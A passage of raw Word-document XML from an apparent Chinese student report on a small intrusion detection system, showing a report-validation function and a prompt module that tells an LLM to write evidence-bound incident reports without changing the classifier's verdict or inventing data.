    <w:p w14:paraId="5A49C08C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        problems.append(f"风险等级不在枚举内：{d.risk}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EFCBC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not d.evidence:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E761596">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        problems.append("缺少证据链")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A9E691">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not d.actions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9B1B4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        problems.append("缺少处置建议")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCCDB40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not d.principle:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496BFDC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        problems.append("缺少协议原理回顾")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7513D028">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return problems</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B49E65C">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5769BBE0">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-21　llm/prompts.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（121 行）　M4 提示词组装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CD6365">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M4 提示词：把「小模型的判定 + 特征证据 + 检索到的协议知识」拼成一次诊断请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4D57D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08CEAB43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>三条硬约束写进系统提示词，因为它们是这个项目最容易被模型违反的三件事：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FCBAD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26BC1176">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. **不许改判**。小模型已经给了类别，LLM 的职责是解释和给处置建议，不是重新分类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F3532C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   放任它改判，就等于把一个可评测的分类器换成一个不可复现的接口。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638FAE56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>2. **只准引用给定的证据**。模型很容易把"典型 DDoS 的表现"当成"本次流量的表现"来写，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD06C5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   报告读起来很专业，但那是编的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F37F0C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>3. **必须回到协议层**。这是计算机网络课设，评审最关心的恰恰是"你懂不懂协议"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6326CC00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6FA0EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AC1161E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F6431D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2395C6D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CD067C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B04FCAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SYSTEM = """你是一名网络安全分析工程师，正在为一个小型入侵检测系统写中文事件报告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4894AAB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02524F44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>铁律：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4FD651">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>1. 攻击类别由上游分类模型给出，你不要改判，也不要给出你自己的类别概率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60349609">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>2. 证据链只能引用用户消息里提供的数据。禁止编造报文内容、IP、时间戳或流量数值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9A5D77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   如果证据不足以支撑某句话，就不写那句话。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBED9B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>3. 处置建议要具体可执行（改什么配置、查哪台主机、封哪个方向），不要写"加强防护"这种空话。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C169281">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>4. 协议原理回顾要讲清楚这类攻击利用的协议机制（握手、状态机、字段语义），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E4823E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   面向的是刚学完计算机网络课程的读者。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162D9DFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>5. 只输出一个 JSON 对象，不要输出解释文字或 Markdown 代码块以外的内容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617091D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01DD190C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>JSON 结构：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CAF8CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23751F5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  "summary": "两三句话说明发生了什么",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573E6FC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  "risk": "info|low|medium|high|critical 五选一",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2526C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  "evidence": ["引用具体特征值的一条证据", "..."],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B3B3C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  "actions": ["具体处置动作", "..."],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26ACB707">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  "principle": "协议原理回顾，一段话"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27660083">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181C906A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56C087CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="447456E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _fmt_evidence(evidence) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C0F9D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    lines = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E32AB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for item in evidence or []:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D53D7E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if isinstance(item, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B976271">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if item.get("detail"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760EA772">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                # 规则命中的证据自带措辞，z 分数对它们没有意义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A5B09E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                lines.append(f"- {item['detail']}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688730FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F4D009">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            z = item.get("z_score")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230E9AC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            lines.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D91367">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"- {item.get('feature')} = {item.get('value')}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB230C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                + (f"（偏离训练分布 {z} 个标准差）" if z is not None else "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF6E32C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1D2FA4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6084FA73">
      <w:pPr>
        <w:widowControl w:val="0"/>
